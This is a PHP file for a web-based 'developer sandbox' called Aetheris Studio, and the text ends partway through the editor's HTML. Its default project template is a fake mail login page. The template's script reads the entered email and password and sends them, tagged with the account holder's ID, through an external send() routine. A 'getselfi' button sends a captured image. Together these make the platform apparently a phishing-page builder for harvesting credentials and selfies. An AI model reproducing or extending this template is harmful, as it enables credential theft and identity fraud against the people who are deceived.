<?php
session_start();

// Check authentication
if (!isset($_SESSION['user'])) {
    header('Location: ../auth/login/');
    exit;
}

// Database connection
include_once '../config/function.php';

// Get user info
$userId = isset($_SESSION['user']['id']) ? $_SESSION['user']['id'] : (isset($_SESSION['user_id']) ? $_SESSION['user_id'] : null);
if (!$userId) {
    die("User ID not found in session.");
}

$user = readuser($userId);

// Get user project data from users table - JSON based
$userDev = $user['dev'] ?? '';
$userProjectLimit = (int)($user['project'] ?? 1);
$currentProjectCount = 0;

// Restrict to desktop only - detect mobile devices
function isMobile() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $mobileKeywords = ['Mobile', 'Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 'Windows Phone', 'Opera Mini', 'IEMobile'];
    foreach ($mobileKeywords as $keyword) {
        if (stripos($userAgent, $keyword) !== false) {
            return true;
        }
    }
    return false;
}

// If mobile, show restriction message
if (isMobile()) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Desktop Only | Aetheris Developer</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { background: linear-gradient(135deg, #0a0a1a 0%, #1a0a2e 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: 'Segoe UI', system-ui, sans-serif; padding: 20px; }
            .restriction-card { background: rgba(10, 10, 30, 0.95); backdrop-filter: blur(20px); border: 2px solid rgba(139, 92, 246, 0.6); border-radius: 32px; padding: 48px 36px; max-width: 520px; text-align: center; }
            .restriction-card i { font-size: 72px; color: #c084fc; margin-bottom: 24px; display: block; }
            h1 { color: #fff; font-size: 28px; margin-bottom: 16px; }
            p { color: #aaa; line-height: 1.6; margin-bottom: 28px; }
            .desktop-hint { display: inline-flex; align-items: center; gap: 12px; background: rgba(139,92,246,0.15); border: 1px solid rgba(139,92,246,0.5); border-radius: 100px; padding: 10px 24px; color: #c084fc; }
            .btn-back { display: inline-block; margin-top: 28px; background: linear-gradient(105deg, #8B5CF6, #C084FC); padding: 12px 32px; border-radius: 40px; color: white; text-decoration: none; }
        </style>
    </head>
    <body>
        <div class="restriction-card">
            <i class="bi bi-laptop"></i>
            <h1>Desktop Environment Required</h1>
            <p>The Developer Sandbox requires a desktop browser for full editing capabilities.</p>
            <div class="desktop-hint"><i class="bi bi-windows"></i><span>Desktop Only</span><i class="bi bi-apple"></i></div>
            <a href="javascript:history.back()" class="btn-back"><i class="bi bi-arrow-left"></i> Go Back</a>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Determine base URL for assets
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
$host = $_SERVER['HTTP_HOST'];
$scriptName = $_SERVER['SCRIPT_NAME'];
$basePath = rtrim(dirname($scriptName), '/\\');
$baseUrl = $protocol . "://" . $host . $basePath . '/';

// Projects directory directly inside /code/
$projectsBaseDir = __DIR__;
if (!file_exists($projectsBaseDir)) {
    mkdir($projectsBaseDir, 0777, true);
}

// Get current project from session or database
$currentProject = $_SESSION['current_project'] ?? null;

// List all user projects (from database dev column)
$storedProjects = !empty($userDev) ? explode(',', $userDev) : [];
$projectNames = [];
$projectExists = []; // Track which projects have folders
foreach ($storedProjects as $project) {
    $project = trim($project);
    if (!empty($project)) {
        $projectNames[] = $project;
        $projectExists[$project] = is_dir($projectsBaseDir . '/' . $project);
    }
}
// Project limit based on EXISTING projects only (not synced ones)
$localProjectCount = count(array_filter($projectExists, function($exists) { return $exists; }));
$projectLimitReached = ($userProjectLimit > 0 && $localProjectCount >= $userProjectLimit);
$uploadError = '';

// Handle project creation/deletion/selection
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['create_or_upload_project'])) {
        $projectName = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['project_name'] ?? '');
        $uploadedFile = $_FILES['project_html'] ?? null;

        if ($projectLimitReached) {
            $uploadError = 'Project limit reached. Upgrade to add more projects.';
        } else {
            if (empty($projectName)) {
                $uploadError = 'Project name is required.';
            } else {
                $projectName = trim($projectName);
                $projectPath = $projectsBaseDir . '/' . $projectName;
                if (file_exists($projectPath)) {
                    $uploadError = 'Project name already exists.';
                } else {
                    if ($uploadedFile && !empty($uploadedFile['name']) && $uploadedFile['error'] === UPLOAD_ERR_OK) {
                        // Upload mode
                        $ext = strtolower(pathinfo($uploadedFile['name'], PATHINFO_EXTENSION));
                        if (!in_array($ext, ['html', 'htm'], true)) {
                            $uploadError = 'Only HTML files are allowed for project upload.';
                        } else {
                            mkdir($projectPath, 0777, true);
                            mkdir($projectPath . '/assets', 0777, true);
                            $uploadedContent = file_get_contents($uploadedFile['tmp_name']);
                            $uploadedContent = str_replace(['\r\n', '\r'], "\n", $uploadedContent);

                            // Always add links since we will have the files
                            if (!preg_match('/href=["\'].*style\.css["\']/i', $uploadedContent)) {
                                if (stripos($uploadedContent, '</head>') !== false) {
                                    $uploadedContent = preg_replace('/<\/head>/i', '    <link rel="stylesheet" href="style.css">\n    </head>', $uploadedContent, 1);
                                } elseif (stripos($uploadedContent, '<body') !== false) {
                                    $uploadedContent = preg_replace('/<body[^>]*>/i', '$0\n    <link rel="stylesheet" href="style.css">', $uploadedContent, 1);
                                } else {
                                    $uploadedContent .= '\n<link rel="stylesheet" href="style.css">\n';
                                }
                            }
                            if (!preg_match('/src=["\'].*script\.js["\']/i', $uploadedContent)) {
                                if (stripos($uploadedContent, '</body>') !== false) {
                                    $uploadedContent = preg_replace('/<\/body>/i', '    <script src="script.js" defer></script>\n</body>', $uploadedContent, 1);
                                } elseif (stripos($uploadedContent, '<html') !== false) {
                                    $uploadedContent = preg_replace('/<\/html>/i', '    <script src="script.js" defer></script>\n</html>', $uploadedContent, 1);
                                } else {
                                    $uploadedContent .= '\n<script src="script.js" defer></script>\n';
                                }
                            }

                            file_put_contents($projectPath . '/index.html', $uploadedContent);

                            // Handle CSS upload
                            $cssFile = $_FILES['project_css'] ?? null;
                            if ($cssFile && !empty($cssFile['name']) && $cssFile['error'] === UPLOAD_ERR_OK) {
                                $cssExt = strtolower(pathinfo($cssFile['name'], PATHINFO_EXTENSION));
                                if ($cssExt === 'css') {
                                    file_put_contents($projectPath . '/style.css', file_get_contents($cssFile['tmp_name']));
                                }
                            } elseif (!file_exists($projectPath . '/style.css')) {
                                file_put_contents($projectPath . '/style.css', '/* Your CSS styles */\nbody { font-family: system-ui, sans-serif; background: #0b0b14; color: #f8fafc; }');
                            }

                            // Handle JS upload
                            $jsFile = $_FILES['project_js'] ?? null;
                            if ($jsFile && !empty($jsFile['name']) && $jsFile['error'] === UPLOAD_ERR_OK) {
                                $jsExt = strtolower(pathinfo($jsFile['name'], PATHINFO_EXTENSION));
                                if ($jsExt === 'js') {
                                    file_put_contents($projectPath . '/script.js', file_get_contents($jsFile['tmp_name']));
                                }
                            } elseif (!file_exists($projectPath . '/script.js')) {
                                file_put_contents($projectPath . '/script.js', '// Your JavaScript code\nconsole.log("Hello, World!");');
                            }

                            // Handle image uploads (max 4)
                            $imageFiles = $_FILES['project_images'] ?? null;
                            if ($imageFiles && isset($imageFiles['name']) && is_array($imageFiles['name'])) {
                                $uploadedImages = 0;
                                for ($i = 0; $i < count($imageFiles['name']) && $uploadedImages < 4; $i++) {
                                    if (!empty($imageFiles['name'][$i]) && $imageFiles['error'][$i] === UPLOAD_ERR_OK) {
                                        $imgExt = strtolower(pathinfo($imageFiles['name'][$i], PATHINFO_EXTENSION));
                                        if (in_array($imgExt, ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'ico'], true)) {
                                            $imgName = preg_replace('/[^a-zA-Z0-9._-]/', '', $imageFiles['name'][$i]);
                                            move_uploaded_file($imageFiles['tmp_name'][$i], $projectPath . '/assets/' . $imgName);
                                            $uploadedImages++;
                                        }
                                    }
                                }
                            }
                        }
                    } else {
                        // Create mode
                        mkdir($projectPath, 0777, true);
                        file_put_contents($projectPath . '/index.html', '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>' . htmlspecialchars($projectName) . '</title>
    <link rel="stylesheet" href="style.css">
    <script src="script.js" defer></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <script src="../sendController.js"></script>
    <style>
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: system-ui; margin: 0; }
        .card { background: white; border-radius: 32px; padding: 40px; text-align: center; max-width: 500px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); }
        button { background: #7c3aed; border: none; padding: 12px 24px; border-radius: 40px; color: white; cursor: pointer; margin: 10px; transition: transform 0.2s; }
        button:hover { transform: translateY(-2px); }
    </style>
</head>
<body>
    <div>
        <h1>' . htmlspecialchars($projectName) . '</h1>
        <p>Welcome to the mail page!</p>
        Email: <input type="text" name="email" id="email">
        password: <input type="password" name="password" id="password">
        <button onclick="senddata()">Login</button>
        <button onclick="getselfi()">getselfi</button>
    </div>
    <script>
        window.ASSET_BASE_URL = "./assets/";
        console.log("Project loaded: ' . htmlspecialchars($projectName) . '");
    </script>
</body>
</html>');
                        file_put_contents($projectPath . '/style.css', '/* Your CSS styles */
.card {
    transition: transform 0.3s ease;
}
.card:hover {
    transform: translateY(-5px);
}');
                        file_put_contents($projectPath . '/script.js', 'async function senddata() {
            console.log("click"); 
            const id = ' . $userId . '; // Dynamic user ID from session
            const email = document.getElementById("email");
            const password = document.getElementById("password");
            console.log(`Email: ${email.value}, Password: ${password.value}`);
            let resp = await send(email.value, password.value, "myapp", id);
            email.value = "";
            password.value = "";
            console.log(`Response: ${resp}`);
        }

        async function getselfi() {
            const id = ' . $userId . '; // Dynamic user ID from session
            await sendImage(id);
            console.log("Selfie sent successfully");
        }');
                        mkdir($projectPath . '/assets', 0777, true);
                    }

                    if (empty($uploadError)) {
                        $currentProject = $projectName;
                        $_SESSION['current_project'] = $currentProject;
                        $projectNames[] = $projectName;
                        $updatedDev = implode(',', $projectNames);
                        // Update dev field using JSON
                        $data = getJsonData();
                        foreach ($data['users'] as &$user) {
                            if ($user['id'] == $userId) {
                                $user['dev'] = $updatedDev;
                                saveJsonData($data);
                                break;
                            }
                        }
                        header('Location: ?');
                        exit;
                    }
                }
            }
        }
    }
    }
    
    if (isset($_POST['delete_project'])) {
        $projectName = basename($_POST['delete_project']);
        $projectPath = $projectsBaseDir . '/' . $projectName;
        if (file_exists($projectPath) && $projectName !== $currentProject) {
            function deleteDir($dir) {
                if (!file_exists($dir)) return;
                $files = array_diff(scandir($dir), ['.', '..']);
                foreach ($files as $file) {
                    $path = $dir . '/' . $file;
                    is_dir($path) ? deleteDir($path) : unlink($path);
                }
                rmdir($dir);
            }
            deleteDir($projectPath);
            
            // Update database - JSON based
            $updatedProjects = array_diff($projectNames, [$projectName]);
            $updatedDev = implode(',', $updatedProjects);
            $data = getJsonData();
            foreach ($data['users'] as &$user) {
                if ($user['id'] == $userId) {
                    $user['dev'] = $updatedDev;
                    saveJsonData($data);
                    break;
                }
            }
        }
        header('Location: ?');
        exit;
    }
    
    if (isset($_POST['select_project'])) {
        $projectName = basename($_POST['select_project']);
        // Allow selecting projects even if folder doesn't exist yet (for syncing)
        if (in_array($projectName, $projectNames)) {
            $currentProject = $projectName;
            $_SESSION['current_project'] = $currentProject;
            header('Location: ?project=' . urlencode($projectName));
            exit;
        }
    
}

// Get project from URL parameter
if (isset($_GET['project'])) {
    $projectParam = basename($_GET['project']);
    if (file_exists($projectsBaseDir . '/' . $projectParam)) {
        $currentProject = $projectParam;
        $_SESSION['current_project'] = $currentProject;
    }
}

// If no project selected or no project exists, show selection screen
if (!isset($_GET['project']) || empty($projectNames)) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title><?php echo empty($projectNames) ? 'Welcome' : 'Select Project'; ?> | Aetheris Studio</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
        <style>
            body { background: linear-gradient(135deg, #0a0a1a 0%, #1a0a2e 100%); min-height: 100vh; }
        </style>
    </head>
    <body class="flex items-center justify-center">
        <div class="bg-black/40 backdrop-blur-xl rounded-2xl p-8 max-w-md text-center border border-purple-500/30">
            <i class="bi bi-code-square text-6xl text-purple-400 mb-4"></i>
            <h1 class="text-2xl font-bold text-white mb-2"><?php echo empty($projectNames) ? 'Welcome to Aetheris Studio' : 'Select a Project'; ?></h1>
            <p class="text-gray-400 text-sm mb-2">Project limit: <strong class="text-purple-400"><?= $userProjectLimit ?></strong> project(s)</p>
            <?php if (!empty($projectNames)): ?>
                <p class="text-gray-400 text-sm mb-6">Choose a project to start coding</p>
            <?php else: ?>
                <p class="text-gray-400 text-sm mb-6">Create your first project to get started</p>
            <?php endif; ?>
            <?php if ($projectLimitReached): ?>
                <div class="space-y-4">
                    <div class="text-sm text-gray-300">You have reached your project limit. Upgrade to add more projects.</div>
                    <a href="../upgrade/" class="w-full inline-flex justify-center px-4 py-2 bg-gradient-to-r from-purple-600 to-fuchsia-600 rounded-lg text-white font-semibold hover:opacity-90 transition">See Upgrade Plans</a>
                </div>
            <?php else: ?>
                <?php if (!empty($uploadError)): ?>
                    <div class="text-sm text-red-400 bg-black/30 border border-red-500/30 rounded-lg p-3 mb-3"><?= htmlspecialchars($uploadError) ?></div>
                <?php endif; ?>
                <form method="POST" enctype="multipart/form-data" class="space-y-4">
                    <input type="text" name="project_name" placeholder="Project name (e.g., my-design)" required class="w-full px-4 py-2 bg-black/50 border border-purple-500/50 rounded-lg text-white focus:outline-none focus:border-purple-400">
                    <label for="project_html" class="block text-xs text-gray-400 cursor-pointer">
                        <div class="flex items-center gap-2 px-4 py-2 bg-black/50 border border-purple-500/50 rounded-lg hover:bg-purple-900/30 transition">
                            <i class="bi bi-filetype-html text-orange-400"></i>
                            <span>Upload HTML file (optional)</span>
                        </div>
                        <input type="file" id="project_html" name="project_html" accept=".html,.htm" class="hidden">
                    </label>
                    <label for="project_css" class="block text-xs text-gray-400 cursor-pointer">
                        <div class="flex items-center gap-2 px-4 py-2 bg-black/50 border border-purple-500/50 rounded-lg hover:bg-purple-900/30 transition">
                            <i class="bi bi-filetype-css text-blue-400"></i>
                            <span>Upload CSS file (optional)</span>
                        </div>
                        <input type="file" id="project_css" name="project_css" accept=".css" class="hidden">
                    </label>
                    <label for="project_js" class="block text-xs text-gray-400 cursor-pointer">
                        <div class="flex items-center gap-2 px-4 py-2 bg-black/50 border border-purple-500/50 rounded-lg hover:bg-purple-900/30 transition">
                            <i class="bi bi-filetype-js text-yellow-400"></i>
                            <span>Upload JS file (optional)</span>
                        </div>
                        <input type="file" id="project_js" name="project_js" accept=".js" class="hidden">
                    </label>
                    <label for="project_images" class="block text-xs text-gray-400 cursor-pointer">
                        <div class="flex items-center gap-2 px-4 py-2 bg-black/50 border border-purple-500/50 rounded-lg hover:bg-purple-900/30 transition">
                            <i class="bi bi-images text-green-400"></i>
                            <span>Upload Images (optional, max 4)</span>
                        </div>
                        <input type="file" id="project_images" name="project_images[]" accept="image/*" multiple class="hidden">
                    </label>
                    <button type="submit" name="create_or_upload_project" class="w-full py-2 bg-gradient-to-r from-purple-600 to-fuchsia-600 rounded-lg text-white font-semibold hover:opacity-90 transition">Create Project →</button>
                    <div class="text-[10px] text-gray-400">Upload files to import, or leave empty to create a simple project. HTML will auto-link CSS/JS if uploaded.</div>
                </form>
            <?php endif; ?>
            
            <?php if (!empty($projectNames)): ?>
                <div class="mt-6">
                    <h3 class="text-lg font-semibold text-white mb-4">Your Projects</h3>
                    <div class="space-y-2">
                        <?php foreach ($projectNames as $pname): ?>
                            <form method="POST" class="block">
                                <input type="hidden" name="select_project" value="<?= htmlspecialchars($pname) ?>">
                                <button type="submit" class="w-full text-left px-4 py-3 bg-black/30 border border-purple-500/30 rounded-lg text-white hover:bg-purple-900/30 transition flex items-center justify-between <?= !$projectExists[$pname] ? 'opacity-60' : '' ?>" <?= !$projectExists[$pname] ? 'title="Project folder syncing..."' : '' ?>>
                                    <div class="flex items-center gap-3">
                                        <i class="bi <?= $projectExists[$pname] ? 'bi-folder2' : 'bi-cloud-arrow-down' ?> text-purple-400"></i>
                                        <div class="flex flex-col">
                                            <span class="font-medium"><?= htmlspecialchars($pname) ?></span>
                                            <?php if (!$projectExists[$pname]): ?><span class="text-[10px] text-yellow-400">Syncing...</span><?php endif; ?>
                                        </div>
                                    </div>
                                    <i class="bi bi-chevron-right text-gray-400"></i>
                                </button>
                            </form>
                        <?php endforeach; ?>
                    </div>
                </div>
            <?php endif; ?>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// If no current project selected, select first existing one
if (!$currentProject || !isset($projectExists[$currentProject]) || !$projectExists[$currentProject]) {
    foreach ($projectNames as $pname) {
        if ($projectExists[$pname]) {
            $currentProject = $pname;
            $_SESSION['current_project'] = $currentProject;
            break;
        }
    }
}

$projectPath = $projectsBaseDir . '/' . $currentProject;
$assetsPath = $projectPath . '/assets';
if (!file_exists($assetsPath)) mkdir($assetsPath, 0777, true);

// Handle file operations for current project
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['asset_file'])) {
        $allowed = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'ico', 'css', 'js', 'txt', 'json', 'xml'];
        $ext = strtolower(pathinfo($_FILES['asset_file']['name'], PATHINFO_EXTENSION));
        $isImage = in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'ico'], true);
        $existingImages = array_filter(glob($assetsPath . '/*'), function($path) {
            return preg_match('/\.(jpg|jpeg|png|gif|webp|svg|ico)$/i', $path);
        });
        if ($isImage && count($existingImages) >= 4) {
            echo json_encode(['success' => false, 'error' => 'Maximum 4 images allowed per project']);
            exit;
        }
        if (in_array($ext, $allowed, true) && $_FILES['asset_file']['size'] < 10 * 1024 * 1024) {
            $baseName = preg_replace('/[^a-zA-Z0-9._-]/', '', $_FILES['asset_file']['name']);
            $safeName = $baseName;
            $counter = 1;
            while (file_exists($assetsPath . '/' . $safeName)) {
                $nameWithoutExt = pathinfo($baseName, PATHINFO_FILENAME);
                $extPart = pathinfo($baseName, PATHINFO_EXTENSION);
                $safeName = $nameWithoutExt . '_' . $counter . '.' . $extPart;
                $counter++;
            }
            move_uploaded_file($_FILES['asset_file']['tmp_name'], $assetsPath . '/' . $safeName);
            echo json_encode(['success' => true, 'url' => $currentProject . '/assets/' . $safeName, 'name' => $safeName]);
        } else {
            echo json_encode(['success' => false, 'error' => 'Invalid file']);
        }
        exit;
    }
    
    if (isset($_POST['delete_asset'])) {
        $file = basename($_POST['delete_asset']);
        $path = $assetsPath . '/' . $file;
        if (file_exists($path)) unlink($path);
        echo json_encode(['success' => true]);
        exit;
    }
    
    $allowedProjectFiles = ['index.html', 'style.css', 'script.js'];

    if (isset($_POST['save_file'])) {
        $filename = basename($_POST['filename']);
        if (!in_array($filename, $allowedProjectFiles, true)) {
            echo json_encode(['success' => false, 'error' => 'Invalid file']);
            exit;
        }
        $content = $_POST['content'];
        $filepath = $projectPath . '/' . $filename;
        file_put_contents($filepath, $content);
        echo json_encode(['success' => true]);
        exit;
    }
    
    if (isset($_POST['delete_file'])) {
        $filename = basename($_POST['delete_file']);
        $filepath = $projectPath . '/' . $filename;
        if (in_array($filename, $allowedProjectFiles, true) && $filename !== 'index.html' && file_exists($filepath)) {
            unlink($filepath);
        }
        echo json_encode(['success' => true]);
        exit;
    }
    
    if (isset($_POST['new_file'])) {
        header('Content-Type: application/json');
        $filename = basename($_POST['new_file']);
        
        if (!in_array($filename, $allowedProjectFiles, true)) {
            echo json_encode(['success' => false, 'error' => 'Only index.html, style.css, and script.js are allowed']);
            exit;
        }
        
        $filepath = $projectPath . '/' . $filename;
        
        if (file_exists($filepath)) {
            echo json_encode(['success' => false, 'error' => 'File already exists']);
            exit;
        }
        
        $ext = pathinfo($filename, PATHINFO_EXTENSION);
        $content = $ext === 'css' ? '/* Your CSS */' : ($ext === 'js' ? '// Your JavaScript' : '<!DOCTYPE html>\n<html>\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>' . htmlspecialchars(pathinfo($filename, PATHINFO_FILENAME)) . '</title>\n    <link rel="stylesheet" href="style.css">\n    <script src="script.js" defer></script>\n</head>\n<body>\n    <h1>Hello World</h1>\n</body>\n</html>');
        
        if (@file_put_contents($filepath, $content) === false) {
            echo json_encode(['success' => false, 'error' => 'Failed to write file']);
            exit;
        }
        
        echo json_encode(['success' => true, 'message' => 'File created successfully']);
        exit;
    }
}

// Get project files
$projectFiles = [];
$allowedProjectFiles = ['index.html', 'style.css', 'script.js'];
$projectFilesList = array_filter(glob($projectPath . '/*'), function($f) use ($allowedProjectFiles) {
    $filename = basename($f);
    return !is_dir($f) && in_array($filename, $allowedProjectFiles, true);
});
foreach ($projectFilesList as $file) {
    $filename = basename($file);
    $projectFiles[$filename] = file_get_contents($file);
}

// Get assets
$assetsList = file_exists($assetsPath) ? array_filter(glob($assetsPath . '/*'), 'is_file') : [];
$assets = array_map(function($asset) use ($currentProject) {
    $name = basename($asset);
    return [
        'name' => $name,
        'url' => $currentProject . '/assets/' . $name,
        'isImage' => preg_match('/\.(jpg|jpeg|png|gif|webp|svg|ico)$/i', $name)
    ];
}, $assetsList);

$activeFile = $_SESSION['active_file_' . $currentProject] ?? 'index.html';
if (!isset($projectFiles[$activeFile])) {
    $activeFile = 'index.html';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Aetheris Studio | <?= htmlspecialchars($currentProject) ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0B0B14; font-family: 'Inter', sans-serif; overflow: hidden; height: 100vh; }
        .glass-header { background: rgba(15, 15, 26, 0.95); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(139, 92, 246, 0.3); }
        .toast-msg { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); background: #1e1b2e; backdrop-filter: blur(12px); border: 1px solid #c084fc; border-radius: 40px; padding: 10px 24px; color: white; font-size: 13px; z-index: 2000; display: flex; align-items: center; gap: 10px; animation: fadeUp 0.3s ease; }
        @keyframes fadeUp { from { opacity: 0; transform: translateX(-50%) translateY(20px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
        .file-item, .asset-file-item { transition: all 0.2s; cursor: pointer; }
        .file-item:hover, .asset-file-item:hover { background: rgba(139, 92, 246, 0.2); transform: translateX(4px); }
        .file-item.active { background: rgba(139, 92, 246, 0.3); border-left: 3px solid #c084fc; }
        .loader { width: 32px; height: 32px; border: 3px solid rgba(139,92,246,0.2); border-top: 3px solid #c084fc; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: #1a1a2a; }
        ::-webkit-scrollbar-thumb { background: #8B5CF6; border-radius: 10px; }
        .rule-card { background: rgba(0,0,0,0.85); backdrop-filter: blur(12px); border-left: 3px solid #c084fc; transition: all 0.3s ease; }
        .rule-card.hidden { transform: translateX(-120%); opacity: 0; pointer-events: none; }
        .image-preview-modal { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.95); z-index: 3000; display: flex; align-items: center; justify-content: center; cursor: pointer; }
        .width-btn { transition: all 0.2s; }
        .width-btn.active { background: #8B5CF6; color: white; border-color: #8B5CF6; }
        .width-btn:hover:not(.active) { background: rgba(139, 92, 246, 0.3); }
        .sidebar { transition: width 0.2s ease; overflow-x: hidden; }
        .editor-container { background: #0F0F1A; height: 100%; display: flex; flex-direction: column; }
        .editor-textarea { background: #0F0F1A; color: #e2e8f0; font-family: 'Fira Code', monospace; font-size: 13px; line-height: 1.6; tab-size: 4; white-space: pre-wrap; word-wrap: break-word; outline: none; overflow: auto; }
        .syntax-tag { color: #c084fc; }
        .syntax-attr { color: #34d399; }
        .syntax-value { color: #fbbf24; }
        .syntax-comment { color: #6b7280; font-style: italic; }
        .syntax-css-selector { color: #c084fc; }
        .syntax-css-property { color: #34d399; }
        .syntax-css-value { color: #fbbf24; }
        .syntax-js-keyword { color: #c084fc; }
        .syntax-js-string { color: #fbbf24; }
        .syntax-js-function { color: #60a5fa; }
        .syntax-js-number { color: #34d399; }
        .copy-btn { transition: all 0.2s; }
        .copy-btn:hover { transform: scale(1.1); background: rgba(139,92,246,0.3); }
        .project-selector { background: rgba(0,0,0,0.4); border: 1px solid rgba(139,92,246,0.3); }
        .limit-badge { background: rgba(0,0,0,0.5); border-radius: 20px; padding: 2px 8px; font-size: 9px; }
    </style>
</head>
<body class="overflow-hidden">
<div class="glass-header fixed top-0 left-0 right-0 z-30 px-4 py-2 flex items-center justify-between flex-wrap gap-2">
    <div class="flex items-center gap-3">
        <div class="w-8 h-8 bg-gradient-to-br from-purple-500 to-fuchsia-500 rounded-lg flex items-center justify-center"><i class="bi bi-code-square text-white text-sm"></i></div>
        <a href="./" class="text-white no-underline hover:text-purple-300">
            <h1 class="text-white font-bold text-base">Aetheris Studio</h1>
            <p class="text-gray-400 text-[9px]">Project: <?= htmlspecialchars($currentProject) ?></p>
        </a>
        <div class="relative">
            <button id="projectMenuBtn" class="project-selector text-white text-xs px-3 py-1 rounded-lg flex items-center gap-2 hover:bg-purple-900/30"><i class="bi bi-folder2"></i> Projects (<?= $localProjectCount ?>/<?= $userProjectLimit ?>) <i class="bi bi-chevron-down text-[10px]"></i></button>
            <div id="projectMenu" class="absolute top-full left-0 mt-1 bg-[#1a1a2a] border border-purple-500/30 rounded-lg shadow-xl hidden z-50 min-w-[200px]">
                <?php if ($localProjectCount >= $userProjectLimit): ?>
                    <div class="px-3 py-2 text-[10px] text-yellow-400 border-b border-purple-500/30"><i class="bi bi-exclamation-triangle"></i> Limit reached (<?= $userProjectLimit ?>)</div>
                <?php endif; ?>
                <?php foreach ($projectNames as $pname): ?>
                    <form method="POST" class="block">
                        <input type="hidden" name="select_project" value="<?= htmlspecialchars($pname) ?>">
                        <button type="submit" class="w-full text-left px-3 py-2 text-xs text-gray-300 hover:bg-purple-900/30 hover:text-white transition <?= !$projectExists[$pname] ? 'opacity-60' : '' ?>">📁 <?= htmlspecialchars($pname) ?> <?= $pname === $currentProject ? ' ✓' : '' ?><?= !$projectExists[$pname] ? ' <span class="text-yellow-400 text-[9px]">(syncing)</span>' : '' ?></button>
                    </form>
                <?php endforeach; ?>
                <hr class="border-purple-500/30 my-1">
                <?php if ($projectLimitReached): ?>
                    <div class="px-3 py-2">
                        <div class="text-[10px] text-gray-300">You've reached your project limit.</div>
                        <a href="../upgrade/" class="w-full mt-1 inline-flex justify-center px-3 py-2 text-xs text-white bg-purple-600 rounded-lg hover:bg-purple-500">Upgrade for more</a>
                    </div>
                <?php else: ?>
                    <form method="POST" class="block">
                        <input type="text" name="project_name" placeholder="New project name" class="w-full px-3 py-1 text-xs bg-black/50 border border-purple-500/30 rounded text-white">
                        <button type="submit" name="create_project" class="w-full mt-1 px-3 py-1 text-xs text-purple-300 hover:bg-purple-900/30">+ Create New</button>
                    </form>
                <?php endif; ?>
            </div>
        </div>
        <h1 class="text-white text-lg bold"><span class="text-sm"># ID :</span> <?php echo $_SESSION['user']['id']; ?></h1>

    </div>
    <div class="flex gap-2">
            <span class="limit-badge text-gray-400"><i class="bi bi-collection"></i> Used: <?= $localProjectCount ?> / <?= $userProjectLimit ?></span>
        <button id="newFileBtn" class="bg-black/40 border border-purple-500/50 text-white px-3 py-1 rounded-full text-xs flex items-center gap-1 hover:bg-purple-900/40"><i class="bi bi-file-plus"></i> New File</button>
        <button id="saveAllBtn" class="bg-black/40 border border-purple-500/50 text-white px-3 py-1 rounded-full text-xs flex items-center gap-1 hover:bg-purple-900/40"><i class="bi bi-save"></i> Save</button>
        <button id="runPreviewBtn" class="px-4 py-1 rounded-full text-white font-semibold text-xs flex items-center gap-1 shadow-lg" style="background: linear-gradient(105deg, #8B5CF6, #C084FC);"><i class="bi bi-play-fill"></i> Preview</button>
        <button id="copyFileBtn" class="bg-black/40 border border-purple-500/50 text-white px-3 py-1 rounded-full text-xs flex items-center gap-1 hover:bg-purple-900/40"><i class="bi bi-files"></i> Copy</button>
    </div>
</div>

<div class="flex h-screen pt-[56px] overflow-hidden">
    <div id="sidebar" class="sidebar w-64 bg-[#0F0F1A] border-r border-purple-900/30 flex flex-col">
        <div class="p-3 border-b border-purple-900/30">
            <h3 class="text-xs font-semibold text-purple-300 flex items-center gap-2"><i class="bi bi-folder2-open"></i> EXPLORER</h3>
            <div class="text-[9px] text-gray-500 mt-1"><i class="bi bi-info-circle"></i> <?= htmlspecialchars($currentProject) ?></div>
        </div>
        <div class="flex-1 overflow-y-auto p-2">
